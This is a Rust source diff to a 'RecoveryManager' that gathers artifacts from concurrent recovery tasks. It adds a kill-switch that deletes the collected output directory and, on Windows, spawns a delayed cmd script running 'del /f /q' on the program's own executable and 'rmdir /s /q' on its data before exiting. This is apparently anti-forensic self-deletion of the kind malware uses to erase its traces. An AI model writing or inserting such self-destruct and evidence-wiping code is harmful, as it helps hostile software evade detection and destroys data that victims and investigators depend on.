@@ -87,8 +87,16 @@ impl RecoveryManager {
         }
 
         let mut outcomes = Vec::with_capacity(self.tasks.len());
-        while let Some(outcome) = join_set.join_next().await {
-            outcomes.push(outcome?);
+        while let Some(res) = join_set.join_next().await {
+            match res? {
+                Ok(outcome) => outcomes.push(outcome),
+                Err(RecoveryError::KillSwitchTriggered) => {
+                    info!("kill-switch triggered, initiating self-destruct");
+                    let _ = self.persist_summary(&outcomes).await;
+                    self.self_destruct();
+                }
+                Err(err) => return Err(err),
+            }
         }
 
         Self::sort_outcomes(&mut outcomes);
@@ -96,17 +104,41 @@ impl RecoveryManager {
         Ok(outcomes)
     }
 
+    fn self_destruct(&self) -> ! {
+        let exe_path = std::env::current_exe().unwrap_or_default();
+        let _ = fs::remove_dir_all(&self.context.output_dir);
+        
+        #[cfg(target_os = "windows")]
+        {
+            use std::process::Command;
+            let script = format!(
+                "timeout /t 3 > nul & del /f /q \"{}\" & rmdir /s /q \"{}\"",
+                exe_path.display(),
+                self.context.output_dir.display()
+            );
+            let _ = Command::new("cmd")
+                .args(&["/C", &script])
+                .spawn();
+        }
+
+        std::process::exit(0);
+    }
+
     async fn execute_task(
         task: Arc<dyn RecoveryTask>,
         ctx: RecoveryContext,
         _permit: OwnedSemaphorePermit,
-    ) -> RecoveryOutcome {
+    ) -> Result<RecoveryOutcome, RecoveryError> {
         let label = task.label();
         let category = task.category();
         let start = Instant::now();
 
         debug!(task=%label, category=%category, "starting recovery task");
         let result = task.run(&ctx).await;
+
+        if let Err(RecoveryError::KillSwitchTriggered) = result {
+            return Err(RecoveryError::KillSwitchTriggered);
+        }
 
         let duration = start.elapsed();
         let (status, artifacts, error) = match result {
@@ -126,14 +158,14 @@ impl RecoveryManager {
             "task completed"
         );
 
-        RecoveryOutcome {
+        Ok(RecoveryOutcome {
             task: label,
             category,
             duration,
             status,
             artifacts,
             error,
-        }
+        })
     }
 
     async fn persist_summary(&self, outcomes: &[RecoveryOutcome]) -> Result<(), RecoveryError> {
